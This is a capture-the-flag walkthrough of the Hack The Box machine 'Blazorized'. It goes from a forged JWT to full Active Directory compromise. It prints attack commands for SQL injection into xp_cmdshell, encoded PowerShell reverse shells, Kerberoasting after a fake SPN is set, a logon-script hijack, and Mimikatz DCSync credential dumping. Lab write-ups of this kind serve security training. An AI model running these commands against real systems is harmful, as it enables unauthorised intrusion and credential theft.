🧠 HTB: Blazorized (Hard) — Full Exploitation Walkthrough

Summary of Objectives Achieved:

    Extracted JWT secret from Blazorized.Helpers.dll

    Forged admin access to admin.blazorized.htb

    Gained RCE via SQLi → Reverse Shell as nu_1055

    Used BloodHound to enumerate AD misconfigs → SPN Write access on rsa_4810

    Kerberoasting → Cracked hash → Shell as rsa_4810

    Abused ACLs to gain shell as ssa_6010 via GPO

    Used Mimikatz DCSync → Extracted NTLM hash → pwned Administrator

🔍 Recon

Initial nmap scan showed port 80 (HTTP) as the only interesting surface.

Visited the site and noted a “Check for Updates” feature. Intercepted traffic using Burp Suite and noticed a JWT token in an Authorization header.
📦 DLL Looting & Token Forgery

Found a suspicious .dll file: Blazorized.Helpers.dll via browser DevTools. Downloaded it and decompiled it using Avalonia ILSpy.

Inside the JWT handler class, found the JWT signing key — granting ability to forge any valid token.

Also identified a hidden subdomain: admin.blazorized.htb.

🔐 Modified token:

    Added role: "Super_Admin"

    Extended exp time

    Verified signature with jwt.io

Stored the forged JWT in browser's local storage → Gained Admin Panel access!
💥 Remote Code Execution via SQL Injection

Explored the admin panel and fuzzed the "Check Duplicate Post Titles" functionality — found MSSQL Injection leading to RCE via xp_cmdshell.

Used Nishang’s Invoke-PowerShellOneLine.ps1 reverse shell — base64-encoded the payload and injected:

test';EXEC xp_cmdshell 'powershell -enc <BASE64>';--

Got a reverse shell as nu_1055.
🩸 BloodHound Enumeration

Uploaded SharpHound.exe and ran:

.\SharpHound.exe -c all

Exfiltrated the results via HTTP PUT → Imported into BloodHound.

Found nu_1055 had SPN write rights on rsa_4810.
🧰 Kerberoasting & Lateral Movement

Downloaded PowerView.ps1 and used it to set a fake SPN:

Set-DomainObject -identity rsa_4810 -SET @{serviceprincipalname='test/blazor'}

Then launched Invoke-Kerberoast — got a valid TGS hash.

Cracked it with Hashcat → Gained plaintext password for rsa_4810.

Used evil-winrm to login as rsa_4810.
🧬 ACL Abuse for Priv Esc

Used Find-InterestingDomainAcl in PowerView to find abuse paths:

Find-InterestingDomainAcl -ResolveGUIDS | ?{$_.IdentityReferenceName -match "rsa_4810"}

Bingo: rsa_4810 could write scriptPath for ssa_6010.

Identified writable path in \\sysvol\<domain>\scripts\A32FF3AEAA23.

Crafted a rev-shell.bat that cradles payload via PowerShell:

echo 'powershell -enc <BASE64_PAYLOAD>' > rev.bat
gc rev.bat | set-content rev-shell.bat -encoding ascii
Set-ADUser -Identity ssa_6010 -ScriptPath 'A32FF3AEAA23\rev-shell.bat'

Caught a reverse shell as ssa_6010.
🧠 Full Compromise via Mimikatz DCSync

Uploaded Mimikatz, ran:

lsadump::dcsync /domain:<fqdn> /user:administrator

Dumped NTLM hash of the Administrator.

Used smbexec.py (Impacket) with the hash — Gained SYSTEM shell.

🏁 Rooted!
🔚 Conclusion

This machine required solid knowledge of JWT manipulation, .NET reverse engineering, Active Directory privilege escalation via SPN and ACL abuse, and Kerberos attacks. A classic blend of web-to-domain compromise with real-world techniques.
